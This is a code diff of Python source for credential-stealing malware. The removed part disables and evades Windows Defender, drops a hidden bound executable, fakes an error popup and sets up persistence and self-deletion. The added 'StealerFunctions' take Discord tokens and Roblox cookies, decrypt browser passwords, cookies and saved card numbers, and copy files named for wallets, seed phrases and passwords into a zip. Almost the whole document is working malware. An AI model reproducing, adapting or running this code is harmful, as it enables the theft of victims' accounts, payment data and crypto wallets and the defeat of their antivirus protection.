-    Logger.info('Trying to create mutex')
-    if not Syscalls.CreateMutex(Settings.Mutex):
-        Logger.info('Mutex already exists, exiting')
-        os._exit(0)
-    if Utility.GetSelf()[1]:
-        Logger.info('Trying to exclude the file from Windows defender')
-        Utility.ExcludeFromDefender()
-    Logger.info('Trying to disable defender')
-    Utility.DisableDefender()
-    if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile((boundFileSrc := os.path.join(sys._MEIPASS, 'bound.blank'))):
-        try:
-            Logger.info('Trying to extract bound file')
-            if os.path.isfile((boundFileDst := os.path.join(os.getenv('temp'), 'bound.exe'))):
-                Logger.info('Old bound file found, removing it')
-                os.remove(boundFileDst)
-            with open(boundFileSrc, 'rb') as file:
-                content = file.read()
-            decrypted = zlib.decompress(content[::-1])
-            with open(boundFileDst, 'wb') as file:
-                file.write(decrypted)
-            del content, decrypted
-            Logger.info('Trying to exclude bound file from defender')
-            Utility.ExcludeFromDefender(boundFileDst)
-            Logger.info('Starting bound file')
-            subprocess.Popen('start bound.exe', shell=True, cwd=os.path.dirname(boundFileDst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-        except Exception as e:
-            Logger.error(e)
-    if Utility.GetSelf()[1] and Settings.FakeError[0] and (not Utility.IsInStartup()):
-        try:
-            Logger.info('Showing fake error popup')
-            title = Settings.FakeError[1][0].replace('"', '\\x22').replace("'", '\\x22')
-            message = Settings.FakeError[1][1].replace('"', '\\x22').replace("'", '\\x22')
-            icon = int(Settings.FakeError[1][2])
-            cmd = 'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'{}\', 0, \'{}\', {}+16);close()"'.format(message, title, Settings.FakeError[1][2])
-            subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-        except Exception as e:
-            Logger.error(e)
-    if not Settings.Vmprotect or not VmProtect.isVM():
-        if Utility.GetSelf()[1]:
-            if Settings.Melt and (not Utility.IsInStartup()):
-                Logger.info('Hiding the file')
-                Utility.HideSelf()
-        elif Settings.Melt:
-            Logger.info('Deleting the file')
-            Utility.DeleteSelf()
-        try:
-            if Utility.GetSelf()[1] and Settings.Startup and (not Utility.IsInStartup()):
-                Logger.info('Trying to put the file in startup')
-                path = Utility.PutInStartup()
-                if path is not None:
-                    Logger.info('Excluding the file from Windows defender in startup')
-                    Utility.ExcludeFromDefender(path)
-        except Exception:
-            Logger.error('Failed to put the file in startup')
-        while True:
+        return False
+
+
+class StealerFunctions:
+    @staticmethod
+    def System_Infos(zip_file):
+        info = False
+        space = ' '
+
+        def info():
+            ip_info = ''
+            with suppress(Exception):
+                eva = requests.get("https://ipwhois.app/json/").json()
+                for i in eva:
+                    len_i = len(i)
+                    pad = 20-len_i
+                    ip_info += f"    - {i}{space*pad}: {eva[i]}\n"
+                return ip_info
+            return '''No IP infos.'''
+
+        try: 
+            IPinfos = info()
+
+            cpu_count = psutil.cpu_count(logical=True)
+            ram_total = round(psutil.virtual_memory().total / (1024**3), 2)
+            disk_usage = psutil.disk_usage('/').percent
+
+            net_info = ''
+            with suppress(Exception):
+                interfaces = psutil.net_if_addrs()
+                max_len = max(len(i) for i in interfaces)
+
+                for iface, addr_list in interfaces.items():
+                    for addr in addr_list:
+                        if addr.family == socket.AF_INET:
+                            pad = max_len - len(iface)
+                            net_info += f"    - {iface}{space * pad} : {addr.address}\n"
+
+            system_infos = f"""
+System infos:
+    - hostname      : {socket.gethostname()}
+    - username      : {getpass.getuser()}
+    - processor     : {platform.processor()}
+    - machine       : {platform.machine()}
+    - platform      : {platform.platform()}
+    - system        : {platform.system()}
+    - release       : {platform.release()}
+    - version       : {platform.version()}
+    - CPU cores     : {cpu_count}
+    - RAM total(GB) : {ram_total}
+    - Disk usage(%) : {disk_usage}
+    - local IP      : {socket.gethostbyname(socket.gethostname())}
+
+Network interfaces:
+{net_info}
+Public IP infos:
+{IPinfos}
+        """
+            info = True
+        except:
+            info = False
+            system_infos = "No infos."
+            
+        zip_file.writestr(f"system_infos.txt", system_infos)
+        return info
+    
+    @staticmethod
+    def Roblox_Cookies(zip_file):
+        file_roblox_account = ""
+        number_roblox_account = 0
+        cookie_list = []
+
+        def GetCookie(cookies):
             try:
-                Logger.info('Checking internet connection')
-                if Utility.IsConnectedToInternet():
-                    Logger.info('Internet connection available, starting stealer (things will be running in parallel)')
-                    BlankGrabber()
-                    Logger.info('Stealer finished its work')
-                    break
+                cookie_str = str(cookies)
+                if ".ROBLOSECURITY=" in cookie_str:
+                    cookie = cookie_str.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
+                    return cookie
+                return None
+            except:
+                return None
+
+        browsers = [
+            browser_cookie3.edge,
+            browser_cookie3.chrome,
+            browser_cookie3.opera,
+            browser_cookie3.firefox,
+            browser_cookie3.opera_gx,
+            browser_cookie3.brave
+        ]
+
+        for browser_func in browsers:
+            try:
+                cookies = browser_func(domain_name=".roblox.com")
+                cookie = GetCookie(cookies)
+                if cookie and cookie not in cookie_list:
+                    cookie_list.append(cookie)
+                    number_roblox_account += 1
+
+                    try:
+                        info = requests.get(
+                            "https://users.roblox.com/v1/users/authenticated",
+                            cookies={".ROBLOSECURITY": cookie},
+                            timeout=10
+                        )
+                        api = info.json() if info.status_code == 200 else {}
+                    except:
+                        api = {}
+
+                    user_id = api.get('id', "None")
+                    username = api.get('name', "None")
+                    display_name = api.get('displayName', "None")
+
+                    file_roblox_account += f"""Roblox Account n°{number_roblox_account}:
+- Navigator     : {browser_func.__name__}
+    - Id            : {user_id}
+    - Username      : {username}
+    - DisplayName   : {display_name}
+    - Cookie        : {cookie}
+                        """
+            except Exception:
+                continue
+
+        if not cookie_list:
+            file_roblox_account = "No roblox cookie found."
+
+        zip_file.writestr(f"Roblox Accounts ({number_roblox_account}).txt", file_roblox_account)
+        return number_roblox_account
+        
+    @staticmethod
+    def Discord_Tokens(zip_file):
+        file_discord_account = ""
+        number_discord_account = 0
+
+        def ExtractToken():  
+            base_url = "https://discord.com/api/v9/users/@me"
+            regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
+            regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
+            tokens = []
+            uids = []
+            token_info = {}
+
+            
+            path_appdata_local = Paths().appdata_local
+            path_appdata_roaming = Paths().appdata_roaming
+
+            paths = [
+                ("Discord",                os.path.join(path_appdata_roaming, "discord", "Local Storage", "leveldb"),                                                  ""),
+                ("Discord Canary",         os.path.join(path_appdata_roaming, "discordcanary", "Local Storage", "leveldb"),                                            ""),
+                ("Lightcord",              os.path.join(path_appdata_roaming, "Lightcord", "Local Storage", "leveldb"),                                                ""),
+                ("Discord PTB",            os.path.join(path_appdata_roaming, "discordptb", "Local Storage", "leveldb"),                                               ""),
+                ("Opera",                  os.path.join(path_appdata_roaming, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),                           "opera.exe"),
+                ("Opera GX",               os.path.join(path_appdata_roaming, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),                        "opera.exe"),
+                ("Opera Neon",             os.path.join(path_appdata_roaming, "Opera Software", "Opera Neon", "Local Storage", "leveldb"),                             "opera.exe"),
+                ("Amigo",                  os.path.join(path_appdata_local,   "Amigo", "User Data", "Local Storage", "leveldb"),                                       "amigo.exe"),
+                ("Torch",                  os.path.join(path_appdata_local,   "Torch", "User Data", "Local Storage", "leveldb"),                                       "torch.exe"),
+                ("Kometa",                 os.path.join(path_appdata_local,   "Kometa", "User Data", "Local Storage", "leveldb"),                                      "kometa.exe"),
+                ("Orbitum",                os.path.join(path_appdata_local,   "Orbitum", "User Data", "Local Storage", "leveldb"),                                     "orbitum.exe"),
+                ("CentBrowser",            os.path.join(path_appdata_local,   "CentBrowser", "User Data", "Local Storage", "leveldb"),                                 "centbrowser.exe"),
+                ("7Star",                  os.path.join(path_appdata_local,   "7Star", "7Star", "User Data", "Local Storage", "leveldb"),                              "7star.exe"),
+                ("Sputnik",                os.path.join(path_appdata_local,   "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb"),                          "sputnik.exe"),
+                ("Vivaldi",                os.path.join(path_appdata_local,   "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"),                          "vivaldi.exe"),
+                ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),                 "chrome.exe"),
+                ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),               "chrome.exe"),
+                ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb"),               "chrome.exe"),
+                ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb"),               "chrome.exe"),
+                ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb"),               "chrome.exe"),
+                ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb"),               "chrome.exe"),
+                ("Google Chrome SxS",      os.path.join(path_appdata_local,   "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
+                ("Google Chrome Beta",     os.path.join(path_appdata_local,   "Google", "Chrome Beta", "User Data", "Default", "Local Storage", "leveldb"),            "chrome.exe"),
+                ("Google Chrome Dev",      os.path.join(path_appdata_local,   "Google", "Chrome Dev", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
+                ("Google Chrome Unstable", os.path.join(path_appdata_local,   "Google", "Chrome Unstable", "User Data", "Default", "Local Storage", "leveldb"),        "chrome.exe"),
+                ("Google Chrome Canary",   os.path.join(path_appdata_local,   "Google", "Chrome Canary", "User Data", "Default", "Local Storage", "leveldb"),          "chrome.exe"),
+                ("Epic Privacy Browser",   os.path.join(path_appdata_local,   "Epic Privacy Browser", "User Data", "Local Storage", "leveldb"),                        "epic.exe"),
+                ("Microsoft Edge",         os.path.join(path_appdata_local,   "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),                "msedge.exe"),
+                ("Uran",                   os.path.join(path_appdata_local,   "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb"),                "uran.exe"),
+                ("Yandex",                 os.path.join(path_appdata_local,   "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),          "yandex.exe"),
+                ("Yandex Canary",          os.path.join(path_appdata_local,   "Yandex", "YandexBrowserCanary", "User Data", "Default", "Local Storage", "leveldb"),    "yandex.exe"),
+                ("Yandex Developer",       os.path.join(path_appdata_local,   "Yandex", "YandexBrowserDeveloper", "User Data", "Default", "Local Storage", "leveldb"), "yandex.exe"),
+                ("Yandex Beta",            os.path.join(path_appdata_local,   "Yandex", "YandexBrowserBeta", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
+                ("Yandex Tech",            os.path.join(path_appdata_local,   "Yandex", "YandexBrowserTech", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
+                ("Yandex SxS",             os.path.join(path_appdata_local,   "Yandex", "YandexBrowserSxS", "User Data", "Default", "Local Storage", "leveldb"),       "yandex.exe"),
+                ("Brave",                  os.path.join(path_appdata_local,   "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),   "brave.exe"),
+                ("Iridium",                os.path.join(path_appdata_local,   "Iridium", "User Data", "Default", "Local Storage", "leveldb"),                          "iridium.exe"),
+            ]
+
+            try:
+                for name, path, proc_name in paths:
+                    for proc in psutil.process_iter(['pid', 'name']):
+                        try:
+                            if proc.name().lower() == proc_name.lower():
+                                proc.kill()
+                        except:
+                            pass
+            except:
+                pass
+
+            for name, path, proc_name in paths:
+                if not os.path.exists(path):
+
+                    continue
+                _d15c0rd = name.replace(" ", "").lower()
+                if "cord" in path:
+                    if not os.path.exists(os.path.join(path_appdata_roaming, _d15c0rd, 'Local State')):
+                        continue
+                    for file_name in os.listdir(path):
+                        if file_name[-3:] not in ["log", "ldb"]:
+                            continue
+                        total_path = os.path.join(path, file_name)
+                        if os.path.exists(total_path):
+                            with open(total_path, errors='ignore') as file:
+                                for line in file:
+                                    for y in re.findall(regexp_enc, line.strip()):
+                                        token = DecryptVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), GetMasterKey(os.path.join(path_appdata_roaming, _d15c0rd, 'Local State')))
+                                        if ValidateToken(token, base_url):
+                                            uid = requests.get(base_url, headers={'Authorization': token}).json()['id']
+                                            if uid not in uids:
+                                                tokens.append(token)
+                                                uids.append(uid)
+                                                token_info[token] = (name, total_path)
                 else:
-                    Logger.info('Internet connection not found, retrying in 10 seconds')
-                    time.sleep(10)
-            except Exception as e:
-                if isinstance(e, KeyboardInterrupt):
-                    os._exit(1)
-                Logger.critical(e, exc_info=True)
-                Logger.info('There was an error, retrying after 10 minutes')
-                time.sleep(600)
-        if Utility.GetSelf()[1] and Settings.Melt and (not Utility.IsInStartup()):
-            Logger.info('Deleting the file')
-            Utility.DeleteSelf()
-        Logger.info('Process ended')
+                    for file_name in os.listdir(path):
+                        if file_name[-3:] not in ["log", "ldb"]:
+                            continue
+                        total_path = os.path.join(path, file_name)
+                        if os.path.exists(total_path):
+                            with open(total_path, errors='ignore') as file:
+                                for line in file:
+                                    for token in re.findall(regexp, line.strip()):
+                                        if ValidateToken(token, base_url):
+                                            uid = requests.get(base_url, headers={'Authorization': token}).json()['id']
+                                            if uid not in uids:
+                                                tokens.append(token)
+                                                uids.append(uid)
+                                                token_info[token] = (name, total_path)
+
+            if os.path.exists(os.path.join(path_appdata_roaming, "Mozilla", "Firefox", "Profiles")):
+                for path, _, files in os.walk(os.path.join(path_appdata_roaming, "Mozilla", "Firefox", "Profiles")):
+                    for _file in files:
+                        if _file.endswith('.sqlite'):
+                            with open(os.path.join(path, _file), errors='ignore') as file:
+                                for line in file:
+                                    for token in re.findall(regexp, line.strip()):
+                                        if ValidateToken(token, base_url):
+                                            uid = requests.get(base_url, headers={'Authorization': token}).json()['id']
+                                            if uid not in uids:
+                                                tokens.append(token)
+                                                uids.append(uid)
+                                                token_info[token] = ('Firefox', os.path.join(path, _file))
+            return tokens, token_info
+
+        def ValidateToken(token, base_url):
+            return requests.get(base_url, headers={'Authorization': token}).status_code == 200
+
+        def DecryptVal(buff, master_key):
+            iv = buff[3:15]
+            payload = buff[15:]
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            return cipher.decrypt(payload)[:-16].decode()
+
+        def GetMasterKey(path):
+            if not os.path.exists(path):
+                return None
+            with open(path, "r", encoding="utf-8") as f:
+                local_state = json.load(f)
+            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+            return CryptUnprotectData(master_key, None, None, None, 0)[1]
+
+        tokens, token_info = ExtractToken()
+        
+        if not tokens:
+            file_discord_account = "Discord token bulunamadı."
+
+        for token_d15c0rd in tokens:
+            number_discord_account += 1
+
+            try: api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token_d15c0rd}).json()
+            except: api = {"None": "None"}
+
+            u53rn4m3_d15c0rd = api.get('username', "None") + '#' + api.get('discriminator', "None")
+            d15pl4y_n4m3_d15c0rd = api.get('global_name', "None")
+            us3r_1d_d15c0rd = api.get('id', "None")
+            em4i1_d15c0rd = api.get('email', "None")
+            em4il_v3rifi3d_d15c0rd = api.get('verified', "None")
+            ph0n3_d15c0rd = api.get('phone', "None")
+            c0untry_d15c0rd = api.get('locale', "None")
+            mf4_d15c0rd = api.get('mfa_enabled', "None")
+
+            try:
+                if api.get('premium_type', 'None') == 0:
+                    n1tr0_d15c0rd = 'False'
+                elif api.get('premium_type', 'None') == 1:
+                    n1tr0_d15c0rd = 'Nitro Classic'
+                elif api.get('premium_type', 'None') == 2:
+                    n1tr0_d15c0rd = 'Nitro Boosts'
+                elif api.get('premium_type', 'None') == 3:
+                    n1tr0_d15c0rd = 'Nitro Basic'
+                else:
+                    n1tr0_d15c0rd = 'False'
+            except:
+                n1tr0_d15c0rd = "None"
+
+            try: av4t4r_ur1_d15c0rd = f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.png"
+            except: av4t4r_ur1_d15c0rd = "None"
+
+            try:
+                billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token_d15c0rd}).json()
+                if billing_discord:
+                    p4ym3nt_m3th0d5_d15c0rd = []
+
+                    for method in billing_discord:
+                        if method['type'] == 1:
+                            p4ym3nt_m3th0d5_d15c0rd.append('Bank Card')
+                        elif method['type'] == 2:
+                            p4ym3nt_m3th0d5_d15c0rd.append("Paypal")
+                        else:
+                            p4ym3nt_m3th0d5_d15c0rd.append('Other')
+                    p4ym3nt_m3th0d5_d15c0rd = ' / '.join(p4ym3nt_m3th0d5_d15c0rd)
+                else:
+                    p4ym3nt_m3th0d5_d15c0rd = "None"
+            except:
+                p4ym3nt_m3th0d5_d15c0rd = "None"
+
+            try:
+                gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token_d15c0rd}).json()
+                if gift_codes:
+                    codes = []
+                    for g1ft_c0d35_d15c0rd in gift_codes:
+                        name = g1ft_c0d35_d15c0rd['promotion']['outbound_title']
+                        g1ft_c0d35_d15c0rd = g1ft_c0d35_d15c0rd['code']
+                        data = f"Gift: \"{name}\" Code: \"{g1ft_c0d35_d15c0rd}\""
+                        if len('\n\n'.join(g1ft_c0d35_d15c0rd)) + len(data) >= 1024:
+                            break
+                        codes.append(data)
+                    if len(codes) > 0:
+                        g1ft_c0d35_d15c0rd = '\n\n'.join(codes)
+                    else:
+                        g1ft_c0d35_d15c0rd = "None"
+                else:
+                    g1ft_c0d35_d15c0rd = "None"
+            except:
+                g1ft_c0d35_d15c0rd = "None"
+        
+            try: software_name, path = token_info.get(token_d15c0rd, ("Unknown", "Unknown"))
+            except: software_name, path = "Unknown", "Unknown"
+
+            file_discord_account = file_discord_account + f"""
+Discord Account n°{str(number_discord_account)}:
+- Path Found      : {path}
+- Software        : {software_name}
+- Token           : {token_d15c0rd}
+- Username        : {u53rn4m3_d15c0rd}
+- Display Name    : {d15pl4y_n4m3_d15c0rd}
+- Id              : {us3r_1d_d15c0rd}
+- Email           : {em4i1_d15c0rd}
+- Email Verified  : {em4il_v3rifi3d_d15c0rd}
+- Phone           : {ph0n3_d15c0rd}
+- Nitro           : {n1tr0_d15c0rd}
+- Language        : {c0untry_d15c0rd}
+- Billing         : {p4ym3nt_m3th0d5_d15c0rd}
+- Gift Code       : {g1ft_c0d35_d15c0rd}
+- Profile Picture : {av4t4r_ur1_d15c0rd}
+- Multi-Factor Authentication : {mf4_d15c0rd}
+"""
+        zip_file.writestr(f"Discord Accounts ({number_discord_account}).txt", file_discord_account)
+
+        return number_discord_account
+
+    @staticmethod
+    def Interesting_Files(zip_file):
+        path_userprofile = Paths().userprofile
+        path_appdata_roaming = Paths().appdata_roaming
+        extensions = ('.txt', '.log', '.ini', '.json', '.xml', '.csv', '.md', '.rtf', '.cfg', '.conf',
+                    '.png', '.jpg', '.jpeg', '.bmp', '.gif', '.tiff', '.svg', '.webp',
+                    '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.odt', '.ods', '.odp',
+                    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
+                    '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv',
+                    '.mp3', '.wav', '.aac', '.flac', '.ogg'
+                )
+
+        paths = [
+            os.path.join(path_userprofile, "Desktop"),
+            os.path.join(path_userprofile, "Downloads"),
+            os.path.join(path_userprofile, "Documents"),
+            os.path.join(path_userprofile, "Picture"),
+            os.path.join(path_userprofile, "Video"),
+            os.path.join(path_userprofile, "OneDrive"),
+            os.path.join(path_appdata_roaming, "Microsoft", "Windows", "Recent")
+        ]
+
+        keywords = [
+            "2fa", "mfa", "2step", "otp", "verification", "verif", "verify",
+            "acount", "account", "compte", "identifiant", "login", "conta", "contas",
+            "personnel", "personal", "perso",
+            "banque", "bank", "funds", "fonds", "paypal", "casino", "banco", "saldo",
+            "crypto", "cryptomonnaie", "bitcoin", "btc", "eth", "ethereum", "atomic", "exodus", "binance", "metamask", "trading", "échange", "exchange", "wallet", "portefeuille", "ledger", "trezor", "seed", "seed phrase", "phrase de récupération", "recovery", "récupération", "recovery phrase", "phrase de récupération", "mnemonic", "mnémonique","passphrase", "phrase secrète", "wallet key", "clé de portefeuille", "mywallet", "backupwallet", "wallet backup", "sauvegarde de portefeuille", "private key", "clé privée", "keystore", "trousseau", "json", "trustwallet", "safepal", "coinbase", "kucoin", "kraken", "blockchain", "bnb", "usdt",
+            "telegram", "disc", "discord", "token", "tkn", "webhook", "api", "bot", "tokendisc",
+            "key", "clé", "cle", "keys", "private", "prive", "privé", "secret", "steal", "voler", "access", "auth",
+            "mdp", "motdepasse", "mot_de_passe", "password", "psw", "pass", "passphrase", "phrase", "pwd", "passwords", "senha", "senhas",
+            "data", "donnée", "donnee", "donnees", "details",
+            "confidential", "confidentiel", "sensitive", "sensible", "important", "privilege", "privilège",
+            "vault", "safe", "locker", "protection", "hidden", "caché", "cache",
+            "identity", "identité", "passport", "passeport", "permis",
+            "pin", "nip",
+            "leak", "dump", "exposed", "hack", "crack", "pirate", "piratage", "breach", "faille", "db", "database"
+            "master", "admin", "administrator", "administrateur", "root", "owner", "propriétaire", "proprietaire",
+            "keyfile", "keystore", "seedphrase", "recoveryphrase", "privatekey", "publickey",
+            "accountdata", "userdata", "logininfo", "seedbackup", "backup", "dados", "documento", "documentos",
+            "WhatsApp", "whatsapp", "Telegram", "telegram"
+        ]
+
+        name_files = []
+
+        for path in paths:
+            for root, dirs, files in os.walk(path):
+                for file in files:
+                    try:
+                        if file.lower().endswith(extensions):
+                            file_name_no_ext = os.path.splitext(file)[0].lower()
+                            for keyword in keywords:
+                                try:
+                                    if keyword.lower() == file_name_no_ext:
+                                        full_path = os.path.join(root, file)
+                                        if os.path.exists(full_path):
+                                            name_files.append(file)
+                                            base_name, ext = os.path.splitext(file)
+                                            with open(full_path, "rb") as f:
+                                                zip_file.writestr(os.path.join("Interesting Files", base_name + f"_{random.randint(1, 9999)}" + ext), f.read())
+                                        break
+                                except:
+                                    pass
+                    except:
+                        pass
+
+        if name_files:
+            number_files = sum(len(phrase.split()) for phrase in name_files)
+        else:
+            number_files = 0
+
+        return number_files
+
+    @staticmethod 
+    def Browser_Infos(zip_file, browser_choice):
+        global number_extentions, number_passwords, number_cookies, number_history, number_downloads, number_cards
+        browsers = []
+        number_cards = 0; file_cards = []
+        number_cookies = 0; file_cookies = []
+        number_history = 0; file_history = []
+        number_passwords = 0; file_passwords = []
+        number_downloads = 0; file_downloads = []
+        number_extentions = 0
+
+        path_appdata_local = Paths().appdata_local
+        path_appdata_roaming = Paths().appdata_roaming
+
+        def GetMasterKey(path):
+            if not os.path.exists(path):
+                return None
+
+            try:
+                with open(path, 'r', encoding='utf-8') as f:
+                    local_state = json.load(f)
+
+                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+                master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+                return master_key
+            except:
+                return None
+
+        def Decrypt(buff, master_key):
+            try:
+                iv = buff[3:15]
+                payload = buff[15:-16]
+                tag = buff[-16:]
+                cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv, tag))
+                decryptor = cipher.decryptor()
+                decrypted_pass = decryptor.update(payload) + decryptor.finalize()
+                return decrypted_pass.decode()
+            except:
+                return None
+            
+        def GetPasswords(browser, profile_path, master_key):
+            global number_passwords
+            password_db = os.path.join(profile_path, 'Login Data')
+            if not os.path.exists(password_db):
+                return
+
+            conn = sqlite3.connect(":memory:")
+            disk_conn = sqlite3.connect(password_db)
+            disk_conn.backup(conn)
+            disk_conn.close()
+            cursor = conn.cursor()
+            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+
+            for row in cursor.fetchall():
+                if not row[0] or not row[1] or not row[2]:
+                    continue
+                url =          f"- Url      : {row[0]}"
+                username =     f"  Username : {row[1]}"
+                password =     f"  Password : {Decrypt(row[2], master_key)}"
+                browser_name = f"  Browser  : {browser}"
+                file_passwords.append(f"{url}\n{username}\n{password}\n{browser_name}\n")
+                number_passwords += 1
+
+            conn.close()
+
+        def GetCookies(browser, profile_path, master_key):
+            global number_cookies
+            cookie_db = os.path.join(profile_path, 'Network', 'Cookies')
+            if not os.path.exists(cookie_db):
+                return
+
+            conn = sqlite3.connect(":memory:")
+            disk_conn = sqlite3.connect(cookie_db)
+            disk_conn.backup(conn)
+            disk_conn.close()
+            cursor = conn.cursor()
+            cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
+
+            for row in cursor.fetchall():
+                if not row[0] or not row[1] or not row[2] or not row[3]:
+                    continue
+                url =          f"- Url     : {row[0]}"
+                name =         f"  Name    : {row[1]}"
+                path =         f"  Path    : {row[2]}"
+                cookie =       f"  Cookie  : {Decrypt(row[3], master_key)}"
+                expire =       f"  Expire  : {row[4]}"
+                browser_name = f"  Browser : {browser}"
+                file_cookies.append(f"{url}\n{name}\n{path}\n{cookie}\n{expire}\n{browser_name}\n")
+                number_cookies += 1
+
+            conn.close()
+
+        def GetHistory(browser, profile_path):
+            global number_history
+            history_db = os.path.join(profile_path, 'History')
+            if not os.path.exists(history_db):
+                return
+            
+            conn = sqlite3.connect(":memory:")
+            disk_conn = sqlite3.connect(history_db)
+            disk_conn.backup(conn)
+            disk_conn.close()
+            cursor = conn.cursor()
+            cursor.execute('SELECT url, title, last_visit_time FROM urls')
+
+            for row in cursor.fetchall():
+                if not row[0] or not row[1] or not row[2]:
+                    continue
+                url =          f"- Url     : {row[0]}"
+                title =        f"  Title   : {row[1]}"
+                time =         f"  Time    : {row[2]}"
+                browser_name = f"  Browser : {browser}"
+                file_history.append(f"{url}\n{title}\n{time}\n{browser_name}\n")
+                number_history += 1
+
+            conn.close()
+        
+        def GetDownloads(browser, profile_path):
+            global number_downloads
+            downloads_db = os.path.join(profile_path, 'History')
+            if not os.path.exists(downloads_db):
+                return
+
+            conn = sqlite3.connect(":memory:")
+            disk_conn = sqlite3.connect(downloads_db)
+            disk_conn.backup(conn)
+            disk_conn.close()
+            cursor = conn.cursor()
+            cursor.execute('SELECT tab_url, target_path FROM downloads')
+            for row in cursor.fetchall():
+                if not row[0] or not row[1]:
+                    continue
+                path =         f"- Path    : {row[1]}"
+                url =          f"  Url     : {row[0]}"
+                browser_name = f"  Browser : {browser}"
+                file_downloads.append(f"{path}\n{url}\n{browser_name}\n")
+                number_downloads += 1
+
+            conn.close()
+        
+        def GetCards(browser, profile_path, master_key):
+            global number_cards
+            cards_db = os.path.join(profile_path, 'Web Data')
+            if not os.path.exists(cards_db):
+                return
+
+            conn = sqlite3.connect(":memory:")
+            disk_conn = sqlite3.connect(cards_db)
+            disk_conn.backup(conn)
+            disk_conn.close()
+            cursor = conn.cursor()
+            cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
+
+            for row in cursor.fetchall():
+                if not row[0] or not row[1] or not row[2] or not row[3]:
+                    continue
+                name =             f"- Name             : {row[0]}"
+                expiration_month = f"  Expiration Month : {row[1]}"
+                expiration_year =  f"  Expiration Year  : {row[2]}"
+                card_number =      f"  Card Number      : {Decrypt(row[3], master_key)}"
+                date_modified =    f"  Date Modified    : {row[4]}"
+                browser_name =     f"  Browser          : {browser}"
+                file_cards.append(f"{name}\n{expiration_month}\n{expiration_year}\n{card_number}\n{date_modified}\n{browser_name}\n")
+                number_cards += 1
+            
+            conn.close()
+
+        def GetExtentions(zip_file, extensions_names, browser, profile_path):
+            global number_extentions
+            extensions_path = os.path.join(profile_path, 'Extensions')
+            zip_folder = os.path.join("Extensions", browser)
+
+            if not os.path.exists(extensions_path):
+                return 
+
+            extentions = [item for item in os.listdir(extensions_path) if os.path.isdir(os.path.join(extensions_path, item))]
+            
+            for extention in extentions:
+                if "Temp" in extention:
+                    continue
+                
+                number_extentions += 1
+                extension_found = False
+                
+                for extension_name, extension_folder in extensions_names:
+                    if extention == extension_folder:
+                        extension_found = True
+                        
+                        extension_folder_path = os.path.join(zip_folder, extension_name, extention)
+                        
+                        source_extension_path = os.path.join(extensions_path, extention)
+                        for item in os.listdir(source_extension_path):
+                            item_path = os.path.join(source_extension_path, item)
+                            
+                            if os.path.isdir(item_path):
+                                for dirpath, dirnames, filenames in os.walk(item_path):
+                                    for filename in filenames:
+                                        file_path = os.path.join(dirpath, filename)
+                                        arcname = os.path.relpath(file_path, source_extension_path)
+                                        zip_file.write(file_path, os.path.join(extension_folder_path, arcname))
+                            else:
+                                zip_file.write(item_path, os.path.join(extension_folder_path, item))
+                        break
+
+                if not extension_found:
+                    other_folder_path = os.path.join(zip_folder, "Unknown Extension", extention)
+                    
+                    source_extension_path = os.path.join(extensions_path, extention)
+                    for item in os.listdir(source_extension_path):
+                        item_path = os.path.join(source_extension_path, item)
+                        
+                        if os.path.isdir(item_path):
+                            for dirpath, dirnames, filenames in os.walk(item_path):
+                                for filename in filenames:
+                                    file_path = os.path.join(dirpath, filename)
+                                    arcname = os.path.relpath(file_path, source_extension_path)
+                                    zip_file.write(file_path, os.path.join(other_folder_path, arcname))
+                        else:
